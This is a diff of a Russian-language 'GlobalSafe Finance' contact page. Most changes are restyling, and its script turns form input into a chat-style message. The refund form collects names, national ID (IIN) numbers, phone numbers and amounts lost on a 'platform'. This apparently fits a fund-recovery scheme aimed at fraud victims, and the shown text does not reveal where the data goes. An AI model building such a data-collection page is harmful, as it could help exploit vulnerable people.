@@ -6,41 +6,45 @@
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="../assets/css/global.css">
   <style>
-body{background:var(--bg);padding-bottom:70px}
-.fp{max-width:500px;margin:0 auto;padding:clamp(20px,4vw,32px) clamp(16px,4vw,16px) 60px}
-.fc{background:rgba(10,10,15,.95);border:1px solid var(--border);border-radius:var(--radius2);padding:clamp(20px,4vw,28px) clamp(16px,4vw,20px) clamp(24px,5vw,36px);position:relative;overflow:hidden;box-shadow:0 20px 50px rgba(0,0,0,.3)}
-.fc::before{content:'';position:absolute;top:-100px;right:-100px;width:250px;height:250px;background:radial-gradient(circle,rgba(99,102,241,.06),transparent);border-radius:50%;pointer-events:none}
-.fc h1{font-size:1.15rem;font-weight:800;color:#fff;margin-bottom:4px;position:relative}
-.fc .sub{color:var(--text3);font-size:.85rem;margin-bottom:24px;position:relative}
+body{background:#000;padding-bottom:70px}
+.fp{max-width:480px;margin:0 auto;padding:clamp(20px,4vw,32px) clamp(16px,4vw,16px) 60px}
+.fc{position:relative;border-radius:var(--radius2);overflow:hidden}
+.fc::before{content:'';position:absolute;inset:-1px;border-radius:var(--radius2);background:linear-gradient(135deg,rgba(99,102,241,.2),rgba(139,92,246,.08));z-index:0}
+.fc-inner{position:relative;z-index:1;background:rgba(6,6,12,.95);backdrop-filter:blur(24px);border:1px solid var(--border);border-radius:var(--radius2);padding:clamp(20px,4vw,28px) clamp(16px,4vw,20px) clamp(24px,5vw,36px)}
+.fc-inner::after{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(99,102,241,.25),transparent)}
+.fc h1{font-size:1.15rem;font-weight:800;color:#fff;margin-bottom:4px}
+.fc .sub{color:var(--text3);font-size:.82rem;margin-bottom:24px}
 .ts{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:20px}
-.to{padding:14px 10px;background:var(--surface);border:2px solid var(--border);border-radius:var(--radius);cursor:pointer;text-align:center;transition:all .3s;position:relative;-webkit-tap-highlight-color:transparent}
+.to{padding:14px 10px;background:rgba(255,255,255,.02);border:2px solid var(--border);border-radius:var(--radius);cursor:pointer;text-align:center;transition:all .3s;position:relative;-webkit-tap-highlight-color:transparent}
 .to:active{transform:scale(.97)}
-.to.sel{border-color:rgba(99,102,241,.4);background:rgba(99,102,241,.06);box-shadow:0 0 20px rgba(99,102,241,.1)}
+.to.sel{border-color:rgba(99,102,241,.35);background:rgba(99,102,241,.05);box-shadow:0 0 24px rgba(99,102,241,.08)}
 .to input{position:absolute;opacity:0;pointer-events:none}
 .to-i{font-size:1.5rem;margin-bottom:4px;display:block}
 .to-n{font-weight:700;font-size:.75rem;color:#fff;display:block}
-.to-d{font-size:.58rem;color:var(--text3);margin-top:2px;display:block}
+.to-d{font-size:.56rem;color:var(--text3);margin-top:2px;display:block}
 .fr{display:grid;grid-template-columns:1fr 1fr;gap:8px}
-.sb{width:100%;padding:14px;background:linear-gradient(135deg,var(--accent),var(--accent2));color:#fff;border:none;border-radius:10px;font-size:.92rem;font-weight:700;cursor:pointer;font-family:var(--font);margin-top:8px;-webkit-tap-highlight-color:transparent;transition:all .25s;box-shadow:0 4px 20px rgba(99,102,241,.3)}
-.sb:hover{box-shadow:0 6px 30px rgba(99,102,241,.4)}
+.sb{width:100%;padding:14px;background:linear-gradient(135deg,var(--accent),var(--accent2));color:#fff;border:none;border-radius:10px;font-size:.9rem;font-weight:700;cursor:pointer;font-family:var(--font);margin-top:8px;transition:all .3s;box-shadow:0 4px 20px rgba(99,102,241,.25)}
+.sb:hover{box-shadow:0 6px 30px rgba(99,102,241,.35)}
 .sb:active{transform:scale(.98)}
 .sb:disabled{opacity:.4;cursor:not-allowed}
 .fs{text-align:center;padding:24px 0}
 .fs-i{font-size:2.5rem;margin-bottom:8px}
 .fs h3{color:#fff;margin-bottom:4px;font-size:1rem}
-.fs p{color:var(--text3);font-size:.85rem}
-.fn{text-align:center;margin-top:12px;font-size:.62rem;color:var(--text4)}
-.hl{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:18px;margin-top:14px;text-align:center}
-.hl h3{font-size:.82rem;font-weight:700;color:#fff;margin-bottom:8px}
+.fs p{color:var(--text3);font-size:.82rem}
+.fn{text-align:center;margin-top:12px;font-size:.6rem;color:var(--text4)}
+.hl{position:relative;border-radius:var(--radius);overflow:hidden;margin-top:14px;text-align:center}
+.hl::before{content:'';position:absolute;inset:-1px;border-radius:var(--radius);background:linear-gradient(135deg,rgba(99,102,241,.15),rgba(139,92,246,.06));z-index:0}
+.hl-inner{position:relative;z-index:1;background:rgba(6,6,12,.9);border:1px solid var(--border);border-radius:var(--radius);padding:18px}
+.hl h3{font-size:.8rem;font-weight:700;color:#fff;margin-bottom:8px}
 .hl-p{font-size:1.3rem;font-weight:800;color:var(--accent3);margin-bottom:2px;letter-spacing:2px}
-.hl-d{font-size:.68rem;color:var(--text3)}
+.hl-d{font-size:.65rem;color:var(--text3)}
 @media(max-width:380px){.ts{grid-template-columns:1fr}.fr{grid-template-columns:1fr}}
   </style>
 </head>
 <body>
   <div id="nav-container" data-page="contacts"></div>
   <div class="fp">
-    <div class="fc">
+    <div class="fc"><div class="fc-inner">
       <h1>📋 Центр обращений</h1>
       <div class="sub">Выберите тип и заполните форму.</div>
       <form id="cf">
@@ -58,19 +62,17 @@ body{background:var(--bg);padding-bottom:70px}
       </form>
       <div id="fs" class="fs" style="display:none"><div class="fs-i">✅</div><h3>Отправлено!</h3><p>Свяжемся в ближайшее время.</p></div>
       <div class="fn">Данные защищены</div>
-    </div>
-    <div class="hl"><div class="hl-d">Горячие линии</div><div class="hl-p">1434 · 102 · 116</div></div>
+    </div></div>
+    <div class="hl"><div class="hl-inner"><div class="hl-d">Горячие линии</div><div class="hl-p">1434 · 102 · 116</div></div></div>
   </div>
   <footer class="ftr"><p>© 2026 GlobalSafe Finance</p></footer>
   <script src="../assets/js/nav.js"></script>
   <script>
   document.querySelectorAll('.to').forEach(function(o){o.addEventListener('click',function(){document.querySelectorAll('.to').forEach(function(x){x.classList.remove('sel')});this.classList.add('sel');this.querySelector('input').checked=true;var t=this.dataset.t;document.querySelector('.rf').style.display=t==='return'?'block':'none';document.querySelector('.df').style.display=t==='docs'?'block':'none';document.querySelector('.ff').style.display=t==='feedback'?'block':'none';document.querySelector('.of').style.display=t==='org'?'block':'none'})});
-
   document.getElementById('cf').addEventListener('submit',function(e){
-    e.preventDefault();var self=this;var btn=self.querySelector('.sb');btn.disabled=true;btn.textContent='Отправка...';
+    e.preventDefault();var self=this,btn=self.querySelector('.sb');btn.disabled=true;btn.textContent='Отправка...';
     var type=document.querySelector('input[name="type"]:checked').value;
-    var text='📋 *Обращение*\n\n📌 Тип: '+type+'\n\n';
-    var d=new FormData(self);
+    var text='📋 *Обращение*\n\n📌 Тип: '+type+'\n\n';var d=new FormData(self);
     if(type==='Возврат средств'){text+='👤 ФИО: '+(d.get('name')||'')+'\n🆔 ИИН: '+(d.get('iin')||'')+'\n📱 Телефон: '+(d.get('phone')||'');if(d.get('extraPhones'))text+='\n📞 Доп: '+d.get('extraPhones');if(d.get('amount'))text+='\n💰 Сумма: '+d.get('amount')+' ₸';if(d.get('company'))text+='\n🏢 Платформа: '+d.get('company');if(d.get('callTime'))text+='\n📅 Звонить: '+d.get('callTime');if(d.get('comment'))text+='\n💬 '+d.get('comment')}
     else if(type==='Документ'){text+='👤 ФИО: '+(d.get('docName')||'')+'\n📱 Телефон: '+(d.get('docPhone')||'')+'\n📄 Документ: '+(d.get('docType')||'');if(d.get('docComment'))text+='\n💬 '+d.get('docComment')}
     else if(type==='Обратная связь'){text+='👤 Имя: '+(d.get('fbName')||'')+'\n📋 Тема: '+(d.get('fbTopic')||'');if(d.get('fbPhone'))text+='\n📱 Телефон: '+d.get('fbPhone');if(d.get('fbMessage'))text+='\n💬 '+d.get('fbMessage')}
